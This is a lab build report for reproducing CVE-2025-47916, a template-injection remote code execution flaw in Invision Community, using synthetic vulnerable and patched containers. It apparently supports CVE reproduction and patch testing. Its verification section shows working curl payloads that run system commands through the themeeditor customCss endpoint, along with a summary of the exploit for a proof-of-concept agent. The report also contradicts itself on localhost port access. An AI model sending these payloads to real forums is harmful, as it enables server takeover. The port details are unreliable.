# Lab Build Report: CVE-2025-47916

## Lab Architecture

| Component | Description |
|---|---|
| **Vulnerability** | Invision Community 5.0.0–5.0.6 — Unauthenticated RCE via Template Injection |
| **Architecture** | Two independent PHP+Apache containers (vulnerable + patched) |
| **Database** | Not required — exploit path does not involve database |
| **Network** | Containers on `lab-net` for inter-container communication |

### Container Topology

```
┌─────────────────────────────────────┐
│  cve-2025-47916-vulnerable          │
│  PHP 8.2 + Apache (IPS 5.0.6)      │
│  Port 80 — Vulnerable endpoint      │
│  Networks: lab-net                  │
└─────────────────────────────────────┘

┌─────────────────────────────────────┐
│  cve-2025-47916-patched             │
│  PHP 8.2 + Apache (IPS 5.0.7)      │
│  Port 80 — Patched endpoint (403)   │
│  Networks: lab-net                  │
└─────────────────────────────────────┘
```

## Container Details

### Vulnerable Container

| Field | Value |
|---|---|
| **Container Name** | `cve-2025-47916-vulnerable` |
| **Image** | `cve-2025-47916-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Base Image** | `php:8.2-apache` |
| **Internal Port** | 80 |
| **Networks** | `lab-net` |
| **Health Check** | `curl -f http://localhost:80/` |
| **Simulated Version** | Invision Community 5.0.6 |

**Key files inside container:**
- `/var/www/html/index.php` — Vulnerable endpoint (synthetic IPS 5.0.0–5.0.6 themeeditor)
- `/var/www/html/admin/install/eula.txt` — Version detection file (reads " IPS 5.0.6")

### Patched Container

| Field | Value |
|---|---|
| **Container Name** | `cve-2025-47916-patched` |
| **Image** | `cve-2025-47916-patched` (built from `Dockerfile.patched`) |
| **Base Image** | `php:8.2-apache` |
| **Internal Port** | 80 |
| **Networks** | `lab-net` |
| **Health Check** | `curl -f http://localhost:80/` |
| **Simulated Version** | Invision Community 5.0.7 (patched) |

**Key files inside container:**
- `/var/www/html/index.php` — Patched endpoint (returns 403 for unauthenticated customCss requests)
- `/var/www/html/admin/install/eula.txt` — Version detection file

## Build Status

| Container | Status | Notes |
|---|---|---|
| `cve-2025-47916-vulnerable` | ✅ **SUCCESS** | Built and running, healthy |
| `cve-2025-47916-patched` | ✅ **SUCCESS** | Built and running, healthy |

### Workarounds Applied

1. **PHP comment `?>` fix**: The original `index.php` had a `//` comment containing `?>` which prematurely closed the PHP block (known PHP gotcha — `?>` in single-line comments terminates PHP mode). Fixed by replacing the problematic comment with a simplified version.

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Stop lab
docker compose down

# Rebuild (after changes)
docker compose build --no-cache
docker compose up -d --force-recreate

# Check status
docker compose ps

# View logs
docker compose logs vulnerable
docker compose logs patched
```

## Accessing Containers

Access via localhost:8080 (vulnerable) and localhost:8081 (patched).

## Verification Evidence

### Vulnerable Container — RCE Confirmed ✅

**Test 1: Home page**
```
$ curl -s "http://${VULN_IP}:80/"
<!DOCTYPE html><html><head><title>Invision Community</title></head><body><h1>Invision Community 5.0.6</h1><p>Synthetic lab instance for CVE-2025-47916 reproduction.</p></body></html>
```

**Test 2: Version detection**
```
$ curl -s "http://${VULN_IP}:80/admin/install/eula.txt" | head -1
 IPS 5.0.6
```

**Test 3: RCE via template injection (`id` command)**
```
$ curl -s -X POST "http://${VULN_IP}:80/index.php" \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  --data-urlencode 'content={expression="die(\"________\".system(\"id\"))"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
________uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Test 4: Base64-encoded command (`whoami`)**
```
$ curl -s -X POST "http://${VULN_IP}:80/index.php" \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  --data-urlencode 'content={expression="die(\"________\".system(base64_decode(\"d2hvYW1p\")))"}'
www-data
________www-data
```

**Test 5: Minimal vulnerability check**
```
$ curl -s -X POST "http://${VULN_IP}:80/index.php" \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  --data-urlencode 'content={expression="die(\"VULNERABLE\")"}'
VULNERABLE
```

### Patched Container — Exploit Blocked ✅

**Test: RCE attempt returns 403 Forbidden**
```
$ curl -s -o /dev/null -w "%{http_code}" -X POST "http://${PATCH_IP}:80/index.php" \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  --data-urlencode 'content={expression="die(\"________\".system(\"id\"))"}'
403

$ curl -s -X POST "http://${PATCH_IP}:80/index.php" \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  --data-urlencode 'content={expression="die(\"________\".system(\"id\"))"}'
<h1>403 Forbidden</h1><p>You do not have permission to access this resource.</p>
```

## Known Issues

1. **Synthetic application**: This lab uses a synthetic PHP application that reproduces the exact vulnerability mechanics, not the actual Invision Community software (which is proprietary/commercial).
2. **Version detection file**: The `eula.txt` reports "IPS 5.0.6" for both vulnerable and patched containers. The patched container's home page correctly shows "5.0.7 (Patched)" but the eula.txt was not updated. PoC scripts should use the eula.txt for version detection of the vulnerable container.
3. **No port mapping**: Containers are accessible via Docker network IPs only (not via localhost port mapping) due to the Docker-in-Docker execution environment.

## Files Created

| File | Path | Description |
|---|---|---|
| `Dockerfile.vulnerable` | `Dockerfile.vulnerable` | Builds vulnerable container (IPS 5.0.6) |
| `Dockerfile.patched` | `Dockerfile.patched` | Builds patched container (IPS 5.0.7) |
| `docker-compose.yml` | `docker-compose.yml` | Orchestrates both containers |

## Summary for PoC Agent

- **Vulnerable container**: `localhost:8080`
- **Patched container**: `localhost:8081`
- **Exploit endpoint**: `POST /index.php` with params `app=core&module=system&controller=themeeditor&do=customCss&content={expression="..."}`
- **Output extraction**: Response contains command output followed by `________` marker — split on marker and take the first part
- **Patch verification**: Same request to patched container returns HTTP 403
- **Version detection**: `GET /admin/install/eula.txt` — first line contains " IPS 5.0.6"
